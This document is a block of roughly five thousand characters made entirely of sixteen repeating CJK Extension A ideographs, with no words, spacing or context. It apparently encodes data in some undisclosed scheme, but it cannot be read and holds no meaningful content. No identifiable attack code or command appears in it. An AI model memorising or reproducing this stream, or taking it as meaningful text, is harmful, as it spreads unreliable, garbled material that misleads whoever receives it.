㒢㒦㒗㒥㒠㒦㒛㒞㒤㒝㒥㒝㒡㒝㒝㒢㒝㒣㒚㒤㒙㒣㒡㒡㒠㒣㒗㒡㒢㒢㒝㒢㒙㒡㒚㒠㒥㒝㒚㒚㒙㒙㒥㒙㒡㒙㒝㒙㒙㒘㒥㒜㒜㒜㒝㒥㒛㒙㒝㒗㒡㒗㒝㒗㒙㒝㒥㒜㒢㒝㒠㒝㒝㒜㒚㒛㒣㒛㒦㒜㒗㒗㒣㒚㒤㒛㒜㒚㒦㒦㒤㒚㒣㒙㒞㒚㒠㒥㒤㒙㒦㒗㒘㒥㒜㒥㒜㒦㒗㒘㒗㒥㒞㒞㒗㒡㒜㒠㒝㒠㒙㒟㒥㒤㒡㒦㒢㒦㒡㒤㒦㒥㒣㒠㒝㒢㒚㒥㒗㒤㒞㒣㒞㒤㒜㒢㒙㒜㒢㒜㒝㒜㒙㒛㒥㒠㒞㒞㒗㒛㒝㒚㒥㒚㒡㒚㒝㒞㒥㒠㒚㒠㒗㒠㒡㒦㒛㒘㒦㒘㒡㒘㒝㒘㒙㒞㒥㒚㒛㒗㒤㒗㒙㒦㒥㒦㒡㒛㒠㒜㒢㒜㒗㒜㒝㒛㒦㒜㒗㒛㒜㒟㒙㒤㒦㒤㒙㒣㒥㒣㒡㒙㒠㒙㒡㒘㒦㒙㒣㒘㒞㒘㒜㒙㒙㒗㒦㒘㒟㒙㒚㒠㒥㒠㒡㒠㒝㒠㒙㒟㒥㒚㒡㒦㒠㒣㒙㒙㒝㒞㒥㒞㒝㒞㒙㒝㒥㒡㒤㒤㒟㒤㒘㒣㒥㒢㒘㒥㒡㒢㒣㒡㒘㒛㒡㒣㒟㒜㒞㒘㒚㒞㒠㒤㒥㒚㒟㒙㒥㒙㒡㒙㒝㒝㒡㒟㒤㒟㒝㒞㒡㒞㒞㒟㒗㒟㒟㒗㒞㒗㒙㒦㒥㒦㒡㒚㒣㒛㒠㒡㒠㒚㒡㒤㒣㒗㒘㒛㒙㒚㒝㒢㒝㒘㒘㒤㒘㒣㒡㒣㒝㒣㒙㒢㒥㒢㒡㒞㒝㒗㒞㒥㒥㒙㒟㒡㒦㒡㒙㒠㒥㒠㒡㒥㒠㒦㒜㒗㒗㒥㒦㒥㒢㒦㒗㒣㒜㒥㒦㒤㒦㒠㒣㒟㒚㒝㒡㒝㒝㒝㒙㒡㒘㒣㒠㒣㒙㒣㒘㒣㒗㒠㒤㒡㒢㒢㒚㒢㒚㒠㒦㒡㒛㒠㒜㒠㒚㒞㒜㒟㒢㒠㒢㒟㒥㒟㒠㒞㒦㒟㒗㒟㒙㒜㒥㒗㒟㒗㒙㒦㒥㒦㒡㒝㒜㒝㒜㒘㒟㒥㒦㒥㒝㒥㒙㒤㒥㒙㒗㒛㒜㒛㒛㒚㒘㒙㒦㒣㒠㒜㒙㒤㒙㒗㒟㒤㒝㒤㒗㒟㒦㒛㒢㒥㒜㒦㒠㒠㒥㒠㒡㒠㒝㒠㒙㒟㒥㒟㒡㒟㒝㒟㒙㒙㒠㒚㒣㒟㒛㒛㒡㒛㒤㒣㒗㒚㒚㒛㒚㒠㒤㒗㒙㒝㒛㒜㒙㒛㒥㒛㒡㒡㒗㒟㒢㒡㒣㒠㒥㒠㒢㒡㒡㒞㒗㒟㒦㒟㒥㒟㒚㒠㒛㒟㒚㒟㒜㒟㒛㒚㒟㒘㒢㒗㒝㒗㒙㒦㒥㒛㒣㒜㒢㒝㒙㒜㒡㒜㒚㒛㒠㒛㒚㒜㒙㒚㒦㒚㒡㒙㒜㒛㒙㒚㒠㒚㒟㒙㒚㒙㒜㒘㒦㒗㒡㒢㒝㒡㒥㒡㒡㒡㒝㒘㒝㒗㒞㒗㒞㒦㒢㒢㒣㒟㒦㒟㒡㒟㒝㒟㒙㒣㒥㒣㒥㒞㒣㒞㒙㒝㒥㒝㒡㒡㒣㒤㒛㒢㒦㒣㒞㒢㒢㒟㒜㒛㒥㒜㒛㒛㒝㒛㒙㒚㒥㒟㒘㒠㒢㒡㒝㒟㒘㒟㒦㒠㒟㒠㒟㒟㒞㒞㒤㒞㒢㒢㒤㒝㒜㒗㒙㒘㒞㒛㒙㒙㒡㒢㒣㒡㒛㒚㒘㒣㒗㒦㒡㒥㒝㒥㒙㒤㒥㒘㒣㒚㒞㒚㒜㒚㒠㒚㒘㒚㒟㒚㒘㒚㒚㒙㒟㒘㒡㒦㒜㒘㒤㒘㒝㒘㒜㒘㒛㒤㒘㒣㒛㒠㒠㒠㒙㒟㒥㒟㒡㒤㒙㒥㒞㒥㒜㒦㒟㒟㒜㒞㒙㒝㒥㒝㒡㒡㒞㒣㒝㒣㒙㒠㒦㒣㒣㒢㒞㒢㒣㒢㒥㒟㒥㒡㒚㒡㒣㒠㒥㒡㒙㒠㒞㒡㒗㒡㒢㒙㒝㒙㒙㒘㒥㒘㒡㒘㒝㒚㒙㒞㒤㒛㒡㒚㒚㒦㒟㒦㒜㒦㒚㒢㒜㒞㒡㒠㒚㒣㒣㒙㒜㒟㒤㒚㒛㒥㒟㒙㒛㒠㒙㒜㒛㒢㒣㒡㒗㒗㒘㒣㒘㒢㒡㒢㒝㒢㒙㒡㒥㒡㒡㒡㒝㒥㒞㒤㒥㒣㒛㒠㒠㒠㒙㒟㒥㒟㒡㒥㒞㒦㒙㒥㒞㒛㒦㒞㒝㒞㒙㒝㒥㒝㒡㒝㒝㒗㒙㒣㒥㒠㒡㒤㒛㒜㒟㒛㒥㒛㒡㒛㒝㒟㒚㒡㒢㒡㒠㒡㒢㒡㒗㒡㒙㒙㒡㒙㒤㒙㒙㒘㒥㒘㒡㒞㒥㒟㒝㒟㒙㒞㒡㒛㒗㒚㒘㒙㒤㒣㒣㒦㒞㒦㒙㒥㒥㒥㒡㒙㒦㒥㒙㒥㒛㒤㒡㒤㒝㒤㒙㒘㒢㒚㒠㒚㒛㒙㒤㒙㒚㒚㒚㒚㒛㒢㒡㒡㒥㒡㒡㒡㒝㒥㒡㒘㒙㒗㒥㒗㒝㒥㒙㒦㒤㒦㒤㒦㒡㒟㒜㒞㒥㒞㒡㒞㒝㒞㒙㒝㒥㒙㒡㒣㒣㒡㒙㒢㒙㒝㒜㒜㒝㒜㒙㒛㒥㒡㒤㒡㒥㒡㒞㒡㒘㒡㒜㒠㒠㒠㒚㒠㒡㒠㒝㒟㒢㒠㒛㒛㒢㒘㒡㒘㒝㒘㒙㒗㒥㒗㒡㒗㒝㒗㒡㒚㒥㒣㒦㒦㒝㒦㒙㒥㒥㒥㒡㒥㒝㒗㒙㒛㒗㒘㒡㒗㒗㒤㒜㒣㒥㒣㒡㒣㒝㒚㒗㒙㒚㒚㒘㒚㒛㒢㒣㒡㒥㒡㒡㒡㒝㒦㒝㒗㒚㒘㒙㒗㒡㒤㒛㒗㒚㒦㒥㒦㒡㒦㒘㒥㒣㒛㒣㒟㒜㒞㒙㒝㒥㒝㒡㒡㒟㒤㒘㒤㒗㒢㒥㒢㒢㒣㒛㒡㒘㒢㒚㒣㒗㒡㒞㒟㒥㒡㒚㒡㒥㒠㒞㒠㒡㒟㒘㒛㒞㒤㒥㒚㒚㒜㒡㒛㒠㒛㒜㒥㒘㒛㒠㒗㒠㒗㒙㒦㒥㒦㒡㒦㒝㒦㒙㒝㒥㒛㒠㒙㒝㒟㒡㒥㒝㒤㒡㒤㒝㒤㒙㒙㒘㒙㒤㒚㒟㒙㒞㒙㒣㒗㒘㒙㒢㒘㒢㒢㒘㒤㒜㒞㒘㒝㒚㒘㒥㒟㒗㒣㒟㒜㒣㒣㒤㒢㒛㒠㒘㒟㒙㒞㒥㒞㒡㒣㒙㒥㒘㒤㒘㒣㒢㒤㒙㒢㒙㒣㒡㒢㒢㒣㒦㒢㒞㒣㒗㒣㒟㒛㒢㒛㒙㒚㒥㒚㒡㒟㒢㒞㒝㒠㒞㒠㒞㒜㒟㒙㒙㒙㒡㒘㒡㒘㒝㒘㒙㒜㒘㒞㒠㒞㒟㒞㒗㒝㒚㒝㒣㒛㒟㒜㒚㒜㒙㒜㒚㒜㒢㒜㒜㒜㒦㒤㒡㒤㒝㒤㒙㒣㒥㒣㒡㒣㒝㒗㒗㒞㒥㒟㒣㒢㒞㒢㒙㒡㒥㒡㒡㒘㒛㒡㒙㒡㒞㒠㒡㒠㒝㒠㒙㒤㒥㒦㒝㒥㒞㒦㒢㒥㒚㒥㒣㒢㒤㒥㒞㒤㒞㒢㒥㒞㒘㒝㒙㒜㒥㒜㒡㒠㒠㒢㒢㒣㒙㒢㒚㒣㒗㒡㒞㒡㒣㒡㒤㒠㒥㒠㒢㒠㒥㒙㒤㒚㒟㒞㒡㒘㒙㒦㒠㒞㒤㒤㒛㒤㒤㒛㒠㒤㒟㒗㒞㒦㒥㒦㒡㒦㒝㒚㒜㒜㒝㒛㒦㒜㒠㒜㒝㒜㒣㒥㒛㒤㒝㒤㒙㒣㒥㒘㒡㒚㒟㒚㒘㒚㒝㒙㒚㒙㒚㒘㒢㒙㒙㒙㒚㒦㒣㒦㒟㒠㒥㒛㒜㒚㒙㒚㒙㒗㒥㒟㒠㒣㒠㒛㒙㒜㒝㒢㒠㒡㒗㒞㒠㒝㒥㒝㒡㒝㒝㒡㒜㒣㒤㒣㒣㒢㒢㒠㒠㒣㒚㒢㒚㒞㒗㒜㒝㒚㒥㒚㒡㒚㒝㒟㒛㒠㒚㒠㒞㒠㒜㒠㒝㒟㒚㒚㒡㒝㒠㒝㒙㒝㒞㒙㒡㒙㒥㒜㒛㒝㒚㒝㒞㒝㒜㒝㒝㒜㒚㒜㒤㒗㒦㒟㒤㒤㒥㒤㒡㒤㒝㒤㒙㒣㒥㒣㒡㒗㒜㒗㒙㒠㒗㒢㒢㒢㒝㒢㒙㒡㒥㒦㒦㒤㒗㒣㒜㒠㒥㒠㒡㒠㒝㒞㒦㒙㒥㒛㒝㒞㒚㒚㒠㒙㒜㒝㒞㒘㒝㒙㒥㒜㒢㒙㒘㒘㒤㒡㒚㒡㒗㒡㒣㒠㒞㒞㒙㒡㒘㒠㒦㒟㒞㒝㒙㒟㒢㒞㒦㒟㒛㒟㒝㒞㒚㒜㒟㒜㒛㒜㒗㒗㒢㒢㒡㒤㒙㒦㒦㒣㒡㒠㒟㒚㒗㒗㒣㒦㒥㒦㒡㒦㒝㒛㒜㒝㒚㒜㒣㒛㒣㒛㒚㒛㒘㒚㒦㒘㒤㒛㒞㒚㒞㒞㒜㒦㒢㒤㒚㒤㒤㒜㒡㒦㒤㒠㒚㒠㒗㒥㒠㒤㒗㒡㒠㒠㒥㒠㒡㒠㒝㒦㒟㒗㒗㒦㒠㒦㒚㒤㒛㒣㒜㒢㒣㒡㒗㒞㒢㒝㒥㒝㒡㒝㒝㒢㒠㒣㒤㒣㒣㒣㒘㒣㒜㒢㒥㒡㒢㒡㒠㒡㒞㒠㒙㒛㒚㒚㒝㒚㒙㒙㒥㒞㒥㒟㒢㒠㒡㒠㒙㒝㒝㒞㒞㒞㒛㒞㒚㒞㒝㒗㒝㒗㒝㒦㒥㒦㒡㒦㒝㒜㒠㒛㒦㒜㒞㒛㒢㒟㒡㒥㒞㒤㒡㒤㒝㒤㒙㒚㒘㒚㒠㒚㒟㒚㒘㒚㒚㒙㒥㒘㒦㒙㒗㒘㒚㒞㒣㒢㒗㒡㒙㒠㒥㒠㒡㒤㒣㒦㒢㒗㒗㒥㒦㒤㒠㒥㒞㒦㒗㒦㒗㒤㒢㒥㒛㒠㒟㒝㒢㒝㒝㒝㒙㒜㒥㒣㒦㒟㒗㒜㒚㒛㒥㒛㒡㒛㒝㒡㒞㒝㒢㒗㒢㒞㒞㒙㒙㒗㒤㒚㒡㒘㒜㒣㒙㒜㒤㒠㒢㒘㒝㒘㒙㒗㒥㒗㒡㒗㒝㒗㒙㒙㒡㒚㒡㒣㒟㒦㒢㒥㒥㒥㒡㒥㒝㒙㒡㒚㒚㒘㒣㒦㒝㒙㒝㒙㒗㒘㒠㒘㒙㒗㒥㒚㒣㒣㒥㒢㒝㒢㒙㒡㒥㒦㒤㒗㒢㒘㒝㒥㒥㒗㒣㒦㒦㒦㒦㒥㒦㒦㒣㒦㒦㒤㒙㒤㒦㒥㒣㒥㒡㒢㒜㒢㒛㒤㒣㒣㒞㒣㒦㒣㒚㒜㒡㒜㒤㒜㒙㒛㒥㒛㒡㒠㒣㒡㒞㒡㒘㒡㒥㒡㒜㒡㒛㒝㒘㒦㒦㒙㒝㒙㒙㒘㒥㒘㒡㒘㒝㒘㒙㒜㒡㒛㒡㒟㒛㒗㒡㒦㒥㒦㒡㒦㒝㒚㒢㒜㒣㒜㒤㒜㒡㒛㒚㒛㒣㒚㒤㒚㒢㒤㒙㒤㒞㒣㒡㒣㒝㒣㒙㒗㒗㒙㒠㒘㒡㒙㒢㒦㒛㒘㒠㒘㒟㒗㒜㒗㒚㒠㒤㒛㒦㒠㒟㒟㒗㒣㒠㒗㒡㒞㒠㒙㒥㒢㒠㒛㒟㒞㒝㒝㒥㒝㒡㒝㒝㒢㒙㒢㒦㒣㒣㒣㒡㒤㒗㒜㒝㒛㒡㒛㒝㒛㒙㒠㒘㒡㒡㒠㒞㒡㒠㒠㒣㒞㒘㒞㒡㒞㒛㒦㒗㒙㒙㒘㒝㒘㒙㒗㒥㒛㒣㒞㒜㒝㒝㒞㒞㒛㒘㒝㒦㒝㒛㒜㒤㒝㒢㒥㒝㒥㒙㒤㒥㒤㒡㒤㒝㒦㒙㒚㒟㒗㒡㒞㒘㒣㒙㒢㒥㒢㒡㒢㒝㒢㒙㒙㒥㒘㒝㒥㒝㒞㒞㒝㒚㒢㒛㒢㒡㒠㒙㒝㒡㒙㒦㒝㒛㒛㒘㒞㒥㒟㒙㒞㒝㒞㒙㒝㒥㒡㒤㒣㒞㒣㒥㒣㒡㒢㒣㒢㒞㒢㒜㒢㒠㒛㒡㒛㒣㒛㒙㒚㒥㒚㒡㒡㒠㒠㒡㒟㒦㒟㒥㒠㒜㒠㒠㒠㒣㒙㒘㒘㒝㒘㒙㒗㒥㒞㒗㒞㒟㒞㒘㒝㒢㒛㒣㒚㒤㒚㒛㒝㒦㒥㒡㒥㒝㒥㒙㒤㒥㒤㒡㒞㒝㒚㒙㒗㒥㒣㒡㒤㒙㒣㒙㒢㒥㒢㒡㒦㒟㒙㒘㒙㒗㒗㒥㒗㒢㒘㒛㒥㒘㒗㒠㒗㒙㒗㒘㒗㒗㒢㒤㒗㒛㒟㒝㒞㒥㒞㒡㒞㒝㒤㒠㒣㒦㒤㒞㒣㒢㒘㒜㒝㒜㒜㒡㒜㒝㒜㒛㒠㒚㒛㒡㒛㒝㒛㒙㒛㒚㒚㒡㒚㒝㒚㒙㒛㒗㒟㒙㒙㒝㒙㒙㒘㒥㒠㒗㒘㒝㒘㒙㒗㒥㒗㒡㒗㒝㒗㒙㒦㒥㒦㒡㒦㒝㒦㒙㒥㒥㒥㒡㒥㒝㒥㒙㒤㒥㒤㒢㒤㒝㒤㒙㒣㒥㒣㒡㒣㒝㒤㒛㒢㒥㒢㒡㒢㒞㒢㒙㒢㒗㒡㒡㒡㒝㒡㒙㒢㒗㒠㒡㒠㒝㒠㒚㒟㒥㒚㒠㒟㒝㒟㒙㒞㒥㒡㒗㒞㒝㒞㒙㒝㒦㒝㒡㒝㒦㒝㒙㒜㒦㒜㒡㒤㒠㒜㒙㒜㒙㒜㒟㒛㒝㒛㒙㒚㒥㒛㒚㒚㒝㒚㒚㒙㒥㒙㒡㒞㒦㒙㒙㒘㒥㒘㒡㒘㒞㒘㒙㒗㒥㒗㒡㒗㒟㒛㒞㒦㒥㒦㒢㒦㒝㒦㒠㒥㒥㒥㒡㒥㒝㒦㒛㒦㒦㒤㒡㒤㒞㒤㒙㒗㒞㒣㒡㒣㒝㒣㒙㒤㒗㒢㒡㒢㒝㒢㒚㒡㒥㒢㒟㒡㒞㒡㒙㒠㒥㒢㒡㒠㒝㒠㒙㒟㒦㒟㒡㒟㒞㒟㒙㒡㒛㒞㒡㒟㒟㒞㒙㒝㒥㒝㒣㒝㒝㒙㒟㒜㒥㒜㒡㒜㒝㒜㒙㒛㒥㒛㒡㒛㒞㒛㒙㒛㒗㒚㒡㒚㒟㒚㒙㒛㒗㒙㒡㒙㒝㒙㒛㒘㒥㒙㒟㒘㒞㒘㒙㒗㒥㒙㒡㒗㒝㒗㒙㒗㒗㒦㒡㒦㒟㒦㒙㒘㒛㒥㒡㒦㒟㒥㒙㒤㒥㒤㒤㒤㒝㒝㒞㒣㒥㒣㒡㒣㒝㒣㒙㒢㒥㒢㒡㒢㒟㒢㒙㒢㒗㒡㒡㒡㒟㒡㒙㒢㒗㒠㒡㒠㒝㒠㒜㒟㒥㒠㒟㒟㒞㒟㒙㒞㒥㒠㒡㒞㒝㒞㒙㒞㒘㒝㒡㒝㒠㒝㒙㒟㒛㒜㒡㒝㒟㒜㒙㒛㒥㒛㒥㒛㒝㒤㒞㒚㒥㒚㒡㒚㒝㒚㒙㒙㒥㒙㒡㒙㒠㒙㒙㒙㒗㒘㒡㒘㒟㒘㒙㒙㒗㒗㒡㒗㒝㒗㒝㒦㒥㒗㒟㒦㒞㒦㒙㒥㒥㒗㒡㒥㒝㒥㒙㒥㒙㒤㒡㒤㒡㒤㒙㒦㒛㒣㒡㒤㒟㒣㒙㒢㒥㒢㒦㒢㒝㒢㒛㒡㒦㒡㒡㒡㒝㒡㒙㒠㒥㒠㒡㒠㒡㒠㒙㒠㒗㒟㒡㒟㒟㒟㒙㒠㒗㒞㒡㒞㒝㒞㒞㒝㒥㒞㒟㒝㒞㒝㒙㒜㒥㒞㒡㒜㒝㒜㒙㒜㒚㒛㒡㒛㒢㒛㒙㒝㒛㒚㒡㒛㒟㒚㒙㒙㒥㒚㒗㒙㒝㒢㒞㒘㒥㒘㒡㒘㒝㒘㒙㒗㒥㒗㒡㒗㒢㒗㒙㒗㒗㒦㒡㒦㒟㒦㒙㒗㒗㒥㒡㒥㒝㒥㒟㒤㒥㒥㒟㒤㒞㒤㒙㒣㒥㒥㒡㒣㒝㒣㒙㒣㒛㒢㒡㒢㒣㒢㒙㒤㒛㒡㒡㒢㒟㒡㒙㒠㒥㒡㒘㒠㒝㒠㒛㒟㒦㒟㒡㒟㒝㒟㒙㒞㒥㒞㒡㒞㒣㒞㒙㒞㒗㒝㒡㒝㒟㒝㒙㒞㒗㒜㒡㒜㒝㒜㒠㒛㒥㒜㒟㒛㒞㒛㒙㒚㒥㒜㒡㒚㒝㒚㒙㒚㒜㒙㒡㒙㒤㒙㒙㒛㒛㒘㒡㒙㒟㒘㒙㒗㒥㒘㒙㒗㒝㒡㒙㒦㒥㒦㒡㒦㒝㒦㒙㒥㒥㒥㒡㒥㒤㒥㒙㒥㒗㒤㒡㒤㒟㒤㒙㒥㒗㒣㒡㒣㒝㒣㒡㒢㒥㒣㒟㒢㒞㒢㒙㒡㒥㒣㒡㒡㒝㒡㒙㒡㒝㒠㒡㒠㒥㒠㒙㒢㒛㒟㒡㒠㒟㒟㒙㒞㒥㒟㒚㒞㒝㒞㒛㒝㒦㒝㒡㒝㒝㒝㒙㒜㒥㒜㒡㒜㒥㒜㒙㒜㒗㒛㒡㒛㒟㒛㒙㒜㒗㒚㒡㒚㒝㒚㒢㒙㒥㒚㒟㒙㒞㒙㒙㒘㒥㒚㒡㒘㒝㒘㒙㒘㒞㒗㒡㒗㒦㒗㒙㒙㒛㒦㒡㒗㒟㒦㒙㒥㒥㒦㒛㒥㒝㒥㒛㒤㒦㒤㒡㒤㒝㒤㒙㒣㒥㒣㒡㒣㒦㒣㒙㒣㒗㒢㒡㒢㒟㒢㒙㒣㒗㒡㒡㒡㒝㒡㒣㒠㒥㒡㒟㒠㒞㒠㒙㒟㒥㒡㒡㒟㒝㒟㒙㒟㒟㒞㒡㒟㒗㒞㒙㒠㒛㒝㒡㒞㒟㒝㒙㒜㒥㒝㒜㒜㒝㒜㒛㒛㒦㒛㒡㒛㒝㒛㒙㒚㒥㒚㒡㒛㒗㒚㒙㒚㒗㒙㒡㒙㒟㒙㒙㒚㒗㒘㒡㒘㒝㒘㒤㒗㒥㒘㒟㒗㒞㒗㒙㒦㒥㒘㒡㒦㒝㒦㒙㒦㒠㒥㒡㒦㒘㒥㒙㒗㒛㒤㒡㒥㒟㒤㒙㒣㒥㒤㒝㒣㒝㒣㒛㒢㒦㒢㒡㒢㒝㒢㒙㒡㒥㒡㒡㒢㒘㒡㒙㒡㒗㒠㒡㒠㒟㒠㒙㒡㒗㒟㒡㒟㒝㒟㒥㒞㒥㒟㒟㒞㒞㒞㒙㒝㒥㒟㒡㒝㒝㒝㒙㒝㒡㒜㒡㒝㒙㒜㒙㒞㒛㒛㒡㒜㒟㒛㒙㒚㒥㒛㒞㒚㒝㒚㒛㒙㒦㒙㒡㒙㒝㒙㒙㒘㒥㒘㒡㒙㒙㒘㒙㒘㒗㒗㒡㒗㒟㒗㒙㒘㒗㒦㒡㒦㒝㒦㒦㒥㒥㒦㒟㒥㒞㒥㒙㒤㒥㒦㒡㒤㒝㒤㒙㒤㒢㒣㒡㒤㒚㒣㒙㒥㒛㒢㒡㒣㒟㒢㒙㒡㒥㒢㒟㒡㒝㒡㒛㒠㒦㒠㒡㒠㒝㒠㒙㒟㒥㒟㒡㒠㒚㒟㒙㒟㒗㒞㒡㒞㒟㒞㒙㒟㒗㒝㒡㒝㒝㒞㒗㒜㒥㒝㒟㒜㒞㒜㒙㒛㒥㒝㒡㒛㒝㒛㒙㒛㒣㒚㒡㒛㒛㒚㒙㒜㒛㒙㒡㒚㒟㒙㒙㒘㒥㒙㒠㒘㒝㒘㒛㒗㒦㒗㒡㒗㒝㒗㒙㒦㒥㒦㒡㒗㒛㒦㒙㒦㒗㒥㒡㒥㒟㒥㒙㒦㒗㒤㒡㒤㒝㒥㒘㒣㒥㒤㒟㒣㒞㒣㒙㒢㒥㒤㒡㒢㒝㒢㒙㒢㒤㒡㒡㒢㒜㒡㒙㒣㒛㒠㒡㒡㒟㒠㒙㒟㒥㒠㒡㒟㒝㒟㒛㒞㒦㒞㒡㒞㒝㒞㒙㒝㒥㒝㒡㒞㒜㒝㒙㒝㒗㒜㒡㒜㒟㒜㒙㒝㒗㒛㒡㒛㒝㒜㒙㒚㒥㒛㒟㒚㒞㒚㒙㒙㒥㒛㒡㒙㒝㒙㒙㒙㒥㒘㒡㒙㒝㒘㒙㒚㒛㒗㒡㒘㒟㒗㒙㒦㒥㒗㒢㒦㒝㒦㒛㒥㒦㒥㒡㒥㒝㒥㒙㒤㒥㒤㒡㒥㒝㒤㒙㒤㒗㒣㒡㒣㒟㒣㒙㒤㒗㒢㒡㒢㒝㒣㒚㒡㒥㒢㒟㒡㒞㒡㒙㒠㒥㒢㒡㒠㒝㒠㒙㒠㒦㒟㒡㒠㒞㒟㒙㒡㒛㒞㒡㒟㒟㒞㒙㒝㒥㒞㒣㒝㒝㒛㒠㒜㒥㒜㒡㒜㒝㒜㒙㒛㒥㒛㒡㒜㒞㒛㒙㒛㒗㒚㒡㒚㒟㒚㒙㒛㒗㒙㒡㒙㒝㒚㒛㒘㒥㒙㒟㒘㒞㒘㒙㒗㒥㒙㒡㒗㒝㒗㒙㒘㒗㒦㒡㒗㒟㒦㒙㒘㒛㒥㒡㒦㒟㒥㒙㒤㒥㒥㒤㒤㒝㒝㒞㒣㒥㒣㒡㒣㒝㒣㒙㒢㒥㒢㒡㒣㒟㒢㒙㒢㒗㒡㒡㒡㒟㒡㒙㒢㒗㒠㒡㒠㒝㒡㒜㒟㒥㒠㒟㒟㒞㒟㒙㒞㒥㒠㒡㒞㒝㒞㒙㒟㒘㒝㒡㒞㒠㒝㒙㒟㒛㒜㒡㒝㒟㒜㒙㒛㒥㒜㒥㒛㒝㒛㒛㒚㒦㒚㒡㒚㒝㒚㒙㒙㒥㒙㒡㒚㒠㒙㒙㒙㒗㒘㒡㒘㒟㒘㒙㒙㒗㒗㒡㒗㒝㒘㒝㒦㒥㒗㒟㒦㒞㒦㒙㒥㒥㒗㒡㒥㒝㒥㒙㒦㒙㒤㒡㒥㒡㒤㒙㒦㒛㒣㒡㒤㒟㒣㒙㒢㒥㒣㒦㒢㒝㒢㒛㒡㒦㒡㒡㒡㒝㒡㒙㒗㒛㒠㒡㒡㒡㒠㒙㒠㒗㒟㒡㒟㒟㒟㒙㒠㒗㒥㒜㒞㒝㒟㒞㒝㒥㒞㒟㒝㒞㒝㒙㒜㒥㒞㒡㒜㒝㒜㒙㒝㒚㒛㒡㒜㒢㒛㒙㒝㒛㒚㒡㒛㒟㒚㒙㒙㒥㒛㒗㒙㒝㒙㒛㒘㒦㒘㒡㒘㒝㒘㒙㒗㒥㒗㒡㒘㒢㒗㒙㒗㒗㒦㒡㒦㒟㒦㒙㒗㒗㒥㒡㒥㒝㒦㒟㒤㒥㒥㒟㒤㒞㒤㒙㒣㒥㒥㒡㒣㒝㒣㒙㒤㒛㒢㒡㒣㒣㒢㒙㒤㒛㒡㒡㒢㒟㒡㒙㒠㒥㒢㒘㒠㒝㒠㒛㒟㒦㒟㒡㒟㒝㒟㒙㒞㒥㒞㒡㒟㒣㒞㒙㒞㒗㒝㒡㒝㒟㒝㒙㒞㒗㒜㒡㒜㒝㒝㒠㒛㒥㒜㒟㒛㒞㒛㒙㒚㒥㒜㒡㒚㒝㒚㒙㒛㒜㒙㒡㒚㒤㒙㒙㒛㒛㒘㒡㒙㒟㒘㒙㒗㒥㒙㒙㒗㒝㒗㒛㒦㒦㒦㒡㒦㒝㒦㒙㒥㒥㒥㒡㒦㒤㒥㒙㒥㒗㒤㒡㒤㒟㒤㒙㒥㒗㒣㒡㒣㒝㒤㒡㒢㒥㒣㒟㒢㒞㒢㒙㒡㒥㒣㒡㒡㒝㒡㒙㒢㒝㒠㒡㒡㒥㒠㒙㒢㒛㒟㒡㒠㒟㒟㒙㒞㒥㒠㒚㒞㒝㒞㒛㒝㒦㒝㒡㒝㒝㒝㒙㒜㒥㒜㒡㒝㒥㒜㒙㒜㒗㒛㒡㒛㒟㒛㒙㒜㒗㒚㒡㒚㒝㒛㒢㒙㒥㒚㒟㒙㒞㒙㒙㒘㒥㒚㒡㒘㒝㒘㒙㒙㒞㒗㒡㒘㒦㒗㒙㒙㒛㒦㒡㒗㒟㒦㒙㒥㒥㒗㒛㒥㒝㒥㒛㒤㒦㒤㒡㒤㒝㒤㒙㒣㒥㒣㒡㒤㒦㒣㒙㒣㒗㒢㒡㒢㒟㒢㒙㒣㒗㒡㒡㒡㒝㒢㒣㒠㒥㒡㒟㒠㒞㒠㒙㒟㒥㒡㒡㒟㒝㒟㒙㒠㒟㒞㒡㒠㒗㒞㒙㒠㒛㒝㒡㒞㒟㒝㒙㒜㒥㒞㒜㒜㒝㒜㒛㒛㒦㒛㒡㒛㒝㒛㒙㒚㒥㒚㒡㒜㒗㒚㒙㒚㒗㒙㒡㒙㒟㒙㒙㒚㒗㒘㒡㒘㒝㒙㒤㒗㒥㒘㒟㒗㒞㒗㒙㒦㒥㒘㒡㒦㒝㒦㒙㒗㒠㒥㒡㒗㒘㒥㒙㒗㒛㒤㒡㒥㒟㒤㒙㒣㒥㒥㒝㒣㒝㒣㒛㒢㒦㒢㒡㒢㒝㒢㒙㒡㒥㒡㒡㒣㒘㒡㒙㒡㒗㒠㒡㒠㒟㒠㒙㒡㒗㒟㒡㒟㒝㒠㒥㒞㒥㒟㒟㒞㒞㒞㒙㒝㒥㒟㒡㒝㒝㒝㒙㒞㒡㒜㒡㒞㒙㒜㒙㒞㒛㒛㒡㒜㒟㒛㒙㒚㒥㒜㒞㒚㒝㒚㒛㒙㒦㒙㒡㒙㒝㒙㒙㒘㒥㒘㒡㒚㒙㒘㒙㒘㒗㒗㒡㒗㒟㒗㒙㒘㒗㒦㒡㒦㒝㒗㒦㒥㒥㒦㒟㒥㒞㒥㒙㒤㒥㒦㒡㒤㒝㒤㒙㒥㒢㒣㒡㒥㒚㒣㒙㒥㒛㒢㒡㒣㒟㒢㒙㒡㒥㒣㒟㒡㒝㒚㒞㒠㒥㒠㒡㒠㒝㒠㒙㒟㒥㒟㒡㒡㒚㒟㒙㒟㒗㒞㒡㒞㒟㒞㒙㒟㒗㒝㒡㒝㒝㒟㒗㒜㒥㒝㒟㒜㒞㒜㒙㒛㒥㒝㒡㒛㒝㒛㒙㒜㒣㒚㒡㒜㒛㒚㒙㒜㒛㒙㒡㒚㒟㒙㒙㒘㒥㒚㒠㒘㒝㒦㒠㒗㒥㒗㒡㒗㒝㒗㒙㒦㒥㒦㒡㒘㒛㒦㒙㒦㒗㒥㒡㒥㒟㒥㒙㒦㒗㒤㒡㒤㒝㒦㒘㒣㒥㒤㒟㒣㒞㒣㒙㒢㒥㒤㒡㒢㒝㒢㒙㒣㒤㒡㒡㒣㒜㒡㒙㒣㒛㒠㒡㒡㒟㒠㒙㒟㒥㒡㒡㒟㒝㒢㒛㒞㒥㒞㒡㒞㒝㒞㒙㒝㒥㒝㒡㒟㒜㒝㒙㒝㒗㒜㒡㒜㒟㒜㒙㒝㒗㒛㒡㒛㒝㒝㒙㒚㒥㒛㒟㒚㒞㒚㒙㒙㒥㒛㒡㒙㒝㒙㒙㒚㒥㒘㒡㒚㒝㒘㒙㒚㒛㒗㒡㒘㒟㒗㒙㒦㒥㒘㒢㒦㒝㒤㒠㒥㒥㒥㒡㒥㒝㒥㒙㒤㒥㒤㒡㒦㒝㒤㒙㒤㒗㒣㒡㒣㒟㒣㒙㒤㒗㒢㒡㒢㒝㒤㒚㒡㒥㒢㒟㒡㒞㒡㒙㒠㒥㒢㒡㒠㒝㒠㒙㒡㒦㒟㒡㒡㒞㒟㒙㒡㒛㒞㒡㒟㒟㒞